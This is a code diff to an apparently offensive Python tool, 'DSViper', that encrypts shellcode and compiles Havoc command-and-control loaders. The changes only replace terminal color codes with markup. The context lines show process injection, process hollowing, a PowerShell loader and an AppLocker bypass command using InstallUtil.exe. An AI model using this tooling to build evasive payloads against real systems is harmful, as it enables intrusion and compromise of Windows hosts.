@@ -37,10 +37,6 @@ def AESencrypt_with_iv(plaintext, key, iv):
     ciphertext = cipher.encrypt(plaintext)
     return ciphertext, key, iv
 def HAVOCone(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
-
     with open(payload_name, "rb") as file:
         content = file.read()
     key = [random.randint(0, 255) for _ in range(16)]
@@ -72,7 +68,7 @@ def HAVOCone(payload_name):
         subprocess.run(
             ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_xor.exe", "xoxo.cpp", "resources.res", "-fpermissive",
              "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_xor.exe")
+        print(f"[green bold][*]Payload successfully created as DSViper_xor.exe[/green bold]")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
@@ -80,9 +76,6 @@ def HAVOCone(payload_name):
     for file in files:
         os.remove(file)
 def HAVOCtwo(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
     with open(payload_name, "rb") as file:
         content = file.read()
     KEY = urandom(16)
@@ -113,7 +106,7 @@ def HAVOCtwo(payload_name):
         subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
         subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_AES.exe", "AESbypass.cpp", "resources.res",
                         "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_AES.exe")
+        print(f"[green bold][*]Payload successfully created as DSViper_AES.exe[/green bold]")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
@@ -121,10 +114,6 @@ def HAVOCtwo(payload_name):
     for file in files:
         os.remove(file)
 def HAVOCfour(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
-
     with open(payload_name, "rb") as file:
         content = file.read()
     key = [random.randint(0, 255) for _ in range(16)]
@@ -156,7 +145,7 @@ def HAVOCfour(payload_name):
         subprocess.run(
             ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_spoolsv.exe", "Processinj_XOR.cpp", "resources.res",
              "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_spoolsv.exe")
+        print(f"[green bold][*]Payload successfully created as DSViper_spoolsv.exe[/green bold]")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
@@ -290,10 +279,6 @@ def HAVOCeightAES_hollow_dll(payload_name):
     for file in files:
         os.remove(file)
 def HAVOCnine_enc(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
-
     with open(payload_name, "rb") as file:
         content = file.read()
     key = [random.randint(0, 255) for _ in range(16)]
@@ -325,7 +310,7 @@ def HAVOCnine_enc(payload_name):
         subprocess.run(
             ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_exp.exe", "Processinj_XOR.cpp", "resources.res",
              "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_exp.exe")
+        print(f"[green bold][*]Payload successfully created as DSViper_exp.exe[/green bold]")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
 
@@ -333,11 +318,6 @@ def HAVOCnine_enc(payload_name):
     for file in files:
         os.remove(file)
 def powershell_havocevery(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
-    YELLOW = "\033[93m"
-
     with open(payload_name, "rb") as file:
         content = file.read()
     key = [random.randint(0, 255) for _ in range(16)]
@@ -427,13 +407,8 @@ def powershell_havocevery(payload_name):
     )
     with open("DSViper.ps1", "w") as cpp_file:
         cpp_file.write(ps1_code)
-    print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper.ps1")
+    print(f"[green bold][*]Payload successfully created as DSViper.ps1[/green bold]")
 def applocker_installutil(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
-    YELLOW = "\033[93m"
-
     with open(payload_name, "rb") as file:
         content = file.read()
     key = [random.randint(0, 255) for _ in range(16)]
@@ -516,9 +491,9 @@ def applocker_installutil(payload_name):
     try:
         subprocess.run(["mcs", "-r:System.Configuration.Install.dll", "applocker.cs"], check=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(f"{GREEN}{BOLD}[*]Payload successfully created as applocker.exe")
+        print(f"[green bold][*]Payload successfully created as applocker.exe[/green bold]")
         print(
-            f"{GREEN}{BOLD}[*]Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker.exe'")
+            f"[green bold][*]Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker.exe'[/green bold]")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
         print("make sure to run 'sudo apt install mono-complete' before using option 11")
@@ -527,11 +502,6 @@ def applocker_installutil(payload_name):
     for file in files:
         os.remove(file)
 def applocker_installutil2(payload_name):
-    GREEN = "\033[92m"
-    BOLD = "\033[1m"
-    WHITE = "\033[97m"
-    YELLOW = "\033[93m"
-
     with open(payload_name, "rb") as file:
         content = file.read()
     key = [random.randint(0, 255) for _ in range(16)]
@@ -606,9 +576,9 @@ def applocker_installutil2(payload_name):
     try:
         subprocess.run(["mcs", "-r:System.Configuration.Install.dll", "applocker2.cs"], check=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        print(f"{GREEN}{BOLD}[*]Payload successfully created as applocker2.exe")
+        print(f"[green bold][*]Payload successfully created as applocker2.exe[/green bold]")
         print(
-            f"{GREEN}{BOLD}[*]Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker2.exe'")
+            f"[green bold][*]Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker2.exe'[/green bold]")
     except subprocess.CalledProcessError as e:
         print(f"Error: {e}")
         print("make sure to run 'sudo apt install mono-complete' before using option 11")
@@ -650,8 +620,6 @@ def indirect(payload_name):
     except requests.RequestException as e:
         print(f"Error: {e}")
         exit(1)
-    print
-
     try:
         res = requests.get(url3)
         with open("syscalls.h", "wb") as f:
@@ -749,8 +717,6 @@ def indirect2(payload_name):
     except requests.RequestException as e:
         print(f"Error: {e}")
         exit(1)
-    print
-
     try:
         res = requests.get(url3)
         with open("syscalls.h", "wb") as f:
